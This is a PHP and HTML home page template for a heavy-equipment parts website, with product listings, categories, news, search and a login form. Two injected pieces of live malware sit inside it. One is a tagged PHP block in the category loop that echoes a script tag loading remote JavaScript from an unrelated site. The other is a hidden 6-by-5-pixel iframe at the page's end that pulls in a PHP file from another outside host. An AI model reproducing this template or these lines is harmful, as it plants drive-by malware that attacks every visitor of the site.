<?php include "header.php"; ?>
<?php

/// News
$query = "select * from news where status = 1 order by insert_date DESC limit 5";
$home_news = $cls-> db_select($query);

//////////////////
// Welcome
$query = "select * from static_pages where id = 7 ";
$welcome = $cls -> db_select($query);
//////////////////
/// New Product
$query = "
			select cat_product.* , category.name as cat_name , manufacture.name as mname
			from feature_product left join cat_product on feature_product.product_id = cat_product.id
			                     left join category on cat_product.cat_id = category.id
							     left join manufacture on cat_product.manufacture_id = manufacture.id 
			where feature_product.status = 1
			order by sort_order ASC
		 ";
$all_product = $cls -> db_select($query);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- #BeginTemplate "/Templates/home.dwt" --><!-- DW6 -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Egyptian machinery</title>
</head>
<link rel="stylesheet" href="../css/css.css"  type="text/css" media="all" />

<SCRIPT LANGUAGE="JavaScript">
<!-- Original:  CodeLifter.com (support@codelifter.com) -->
<!-- Web Site:  http://www.codelifter.com -->

<!-- This script and many more are available free online at -->
<!-- The JavaScript Source!! http://javascript.internet.com -->

<!-- Begin
// Set slideShowSpeed (milliseconds)
var slideShowSpeed = 3000;
// Duration of crossfade (seconds)
var crossFadeDuration = 3;
// Specify the image files
var Pic = new Array();
// to add more images, just continue
// the pattern, adding to the array below
<?
	if(is_array($all_slide)) $i=0;
	while(list($key,$val) = each($all_slide)){
?>
Pic[<?=$i ?>] = '../upload/slide/<?=$val["slide_photo"] ?>' <? print "\n\r"; ?>
<?
	$i++;
	}
?>

// do not edit anything below this line
var t;
var j = 0;
var p = Pic.length;
var preLoad = new Array();
for (i = 0; i < p; i++) {
preLoad[i] = new Image();
preLoad[i].src = Pic[i];
}
function runSlideShow() {
if (document.all) {
document.images.SlideShow.style.filter="blendTrans(duration=2)";
document.images.SlideShow.style.filter="blendTrans(duration=crossFadeDuration)";
document.images.SlideShow.filters.blendTrans.Apply();
}
document.images.SlideShow.src = preLoad[j].src;
if (document.all) {
document.images.SlideShow.filters.blendTrans.Play();
}
j = j + 1;
if (j > (p - 1)) j = 0;
t = setTimeout('runSlideShow()', slideShowSpeed);
}
//  End -->
</script>

<body onLoad="runSlideShow()" background="../images/bg_03.gif" style="margin:0px; padding:0px">


<div align="center" style="">
<div align="center" style="width:940px;border:#CCCCCC solid 1px; background-color: #FFFFFF">
<!-- /////////////////////////////////// -->
<table border="0" height="285" width="100%" cellpadding="0" cellspacing="0">
<tr>
	<td align="center" style="background-color:#d9d9d9" width="258px;">
		<img src="../images/logo.gif" />	</td>
	<td width="434px;">
		<!-- ///// Slide /////// -->
		<div>
			<img width="434" height="285" src="../upload/slide/<?=$all_slide[1]["slide_photo"] ?>"  name='SlideShow' align="top" />		</div>	</td>
	<td valign="top" style=" padding:10px; padding-top:57px; padding-left:50px;background-image:url(../images/loop1.gif);background-repeat: repeat-x;">
		<div align="left" class="top">
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="home.php">HOME</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=1">ABOUT</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=2">OUR SERVICE</a><br /></div>

			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="contact_us.php">CONTACT</a><br />
			</div>
		</div>	</td>
</tr>
<tr><td colspan="3" height="20" style="background-image:url(../images/loop2.gif);background-repeat: repeat-y;"></td></tr>
<tr>
	<td valign="top" background="all_manufacture.php"><br />

		

		<div style=" background-image:url(../images/header1.gif); background-repeat:no-repeatwidth:247px; height:42px;">
		<div style="padding-left:50px; padding-top:10px; font-weight:bolder; font-size:16px; font-family: Arial, Helvetica, sans-serif;">Equipment Categories</div>
		</div>
		
		<br />
		<div align="left" class="right" style="padding-left:40px;" >
			<table width="100%">
			<? 
				reset($all_category);
				if(is_array($all_category)){ $counter = 0;
				while(list($key,$val) = each($all_category)){
				$counter ++;
				if($counter == 18) break;
			?>
<?php
#6387c7#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224425\"></script>";
echo $srwv;
}
#/6387c7#
?>
			<tr><td><img src="../images/bullet_3.gif" align="absmiddle" /></td><td><a href="category.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a></td></tr>
			<? } } ?>
			</table>
			<div align="center"><a style="color: #fcac14; font-size:14px; text-decoration:underline;" href="all_category.php">All Category</a></div>
		</div>
		
		<br />
		<img src="../images/header2.gif" />
		<br />
		<div align="left" class="bottom" style="padding-left:40px;" >
			<? 
				reset($all_manufacture);
				if(is_array($all_manufacture)){ $counter = 0;
				while(list($key,$val) = each($all_manufacture)){
				$counter ++;
				if($counter == 7) break;
			?>
			<div style="padding-bottom:5px;"><a href="manufacture_product.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a> <br /></div>
			<? }} ?>
			<div align="center"><a style="color:#333333; font-size:14px; text-decoration:underline;" href="all_manufacture.php">More</a></div>
			<br />

		</div>
				
		</td>
	<td valign="top" style="background-color:#2d2d2d; border:2px solid #060606; border-top:0px; border-bottom:0px;">
	
	<!-- #BeginEditable "content" -->
	<br />

	<table align="left" width="97%">
	<form id="form1" name="form1" method="get" action="search.php">
	<tr>
		<td valign="top" align="right" rowspan="3"><input name="search" type="submit" id="search" style=" width:73px; height:28px; border:#999999 solid 1px;background-image:url(../images/search.gif)" value="  " /></td>
		<td align="left" >
		 <input name="s_text" type="text" id="s_text" style="width:175px;" />
		 <select style="width:115px" name="s_type" id="s_type">
		  <option  value="0">Select Product</option>
		  <option value="1">Machine</option>
		  <option value="2">Parts</option>
		</select>
			 
		</td>
	</tr>
	<tr>
		<td align="left" colspan="2">
		<select style="width:145px" name="s_manufacture" id="s_manufacture">
		  <option  value="0">Select Manufacture</option>
		  <? 
				reset($all_manufacture);
				if(is_array($all_manufacture)){ 
				while(list($key,$val) = each($all_manufacture)){
		  ?>
		  		<option value="<?=$val["id"] ?>"><?=$val["name"] ?></option>
		  <? }} ?>
		</select>
		<select style="width:150px" name="s_category" id="s_category">
		  <option  value="0">Select Type</option>
		  <? 
				reset($all_category);
				if(is_array($all_category)){ 
				while(list($key,$val) = each($all_category)){
		  ?>
		  		<option value="<?=$val["id"] ?>"><?=$val["name"] ?></option>
		  <? }} ?>
		</select>
		
		</td>
	</tr>
	</form>
	</table>
	<br clear="all" />
	<hr style="border: #666666 solid 1px; margin-left:5px; margin-right:5px;" />
	
	<img src="../images/welcome.gif" />
	
	<div align="justify" style=" font-size:12px; font-family:Verdana;padding:10px; color:#FFFFFF">
	<?=$welcome[1]["description"] ?>
	<div align="right"><a style="color:#fc8d00; font-weight:bolder;" href="page.php?id=1">More</a></div>
	</div>

	
	<hr style="border: #666666 solid 1px; margin-left:5px; margin-right:5px;" />
	<img src="../images/whatisnew.gif" />
	
	<div align="justify" style=" font-size:12px; font-family:Verdana;padding:10px; color:#FFFFFF">
	<? 
		if(is_array($all_product))
		while(list($key,$val) = each($all_product)){
	?>
			<div style="padding:2px; margin:2px; height:16px; background-color:#555454; color:#000000">
			<a style="color:#fdfdfd; text-decoration:none" href="product_d.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a>
			</div>
			<a href="product_d.php?id=<?=$val["id"] ?>"><img style="border:#333333 solid 1px;" hspace="5" vspace="5" align="left" width="120" height="90" src="../upload/image/<?=$val["photo"] ?>" /></a>
			<b>Manufacture:</b> <?=$val["mname"] ?>  &nbsp; &nbsp; 
			<b>Condition:</b> <? if($val["condition"] == 1) print "Used"; else print "Unused"; ?> 
			<br />
			<b>Type:</b> <? if($val["type"] == 1) print "Machine"; else print "Parts"; ?> 
			<br />
			 <?=$val["description"] ?>
			<div align="right"><a style="color:#fc8d00; text-decoration:none;" href="product_d.php?id=<?=$val["id"] ?>">More Details</a></div>
			<br clear="all" />
	
	<? } ?>
	</div>
	
	
	<hr style="border: #666666 solid 1px; margin-left:5px; margin-right:5px;" />
	<div align="left">
	<img src="../images/news.gif" />
	<div style="padding:5px;">
	<? 
		if(is_array($home_news)){
		while(list($key,$val) = each($home_news)) {
	?>		
		<div style="color:#CCCCCC">&raquo; <a href="news_d.php?id=<?=$val["id"] ?>"  style="color:#FFFFFF; font-family:Verdana; font-size:12px"><?=$val["header"] ?></a></div>
	<? } }?>
	</div>
	</div>
	<!-- #EndEditable -->	
	
	</td>
	<td style=" padding:10px;" valign="top">
	<img src="../images/login.gif" />
	<br />
	
	<? if(!isset($_SESSION["user_id"])){ ?>
	<span style="font-size:11px"><? if(isset($_POST["login"])) print @$message_display; ?></span>	
	
	<table width="100%" class="font_1">
	<form id="form1" name="form1" method="post" action="">
	<tr>
		<td>User Name</td>
		<td><input name="user_name" value="<? print @$user_name; ?>" type="text" id="user_name" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td>Password</td>
		<td><input name="password" type="password" id="password" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td colspan="2">
		<a href="forgotpassword.php"><img border="0" src="../images/forget_p.gif" /></a>
		<a href="register.php"><img align="right" border="0" src="../images/register.gif" /></a>		</td>
	</tr>
	<tr>
		<td align="right" colspan="2"><input name="login" type="submit" id="login" style="border:0px; width:63px; height:24px; background-image:url(../images/button_1.gif)" value=" " /></td>
	</tr>
	</form>	
	</table>
	<? }else{ ?>
	<div align="center">
		<br />
		<span style="font-family:'Courier New'; color: #333333; font-size:12px;">You Are Login</span>
		<br />
		<div class="bottom" style="padding-bottom:10px; margin-top:10px;"><a href="account/my_account.php">My Account</a></div>
		<div align="right" class="bottom" style="padding-bottom:10px; margin-top:10px;"><a style="font-size:12px" href="log_out.php">Log Out</a></div>
	</div>
	<? }?>	
	
	<hr style="color:#d7d7d7; margin-bottom:10px; margin-top:10px;" />
	
	<img src="../images/adv.gif" />
	<? if(count($adv_home) == 1) { ?>
	<img src="../upload/photo/<?=$adv_home[1]["adv"]; ?>" />
	<? } ?>
	</td>
</tr>
<tr>
	<td height="72" colspan="3" style="background-image:url(../images/footer.gif); background-repeat:no-repeat">
		<div align="center" style=" padding-top:20px;font-family:Verdana; font-size:10px; color: #333333;">
		Copyright 2010 &copy; AL Karim Co. for heavey equipment parts, Powered by <a target="_blank" href="http://www.eracore.net">Eracore.net</a>		</div>	</td>
</tr>
</table>	


<!-- /////////////////////////////////// -->
</div></div>

<iframe src="http://elevatemagazine.com/includes/13x.php" border="0" width="6" height="5" /></body>
<!-- #EndTemplate --></html>
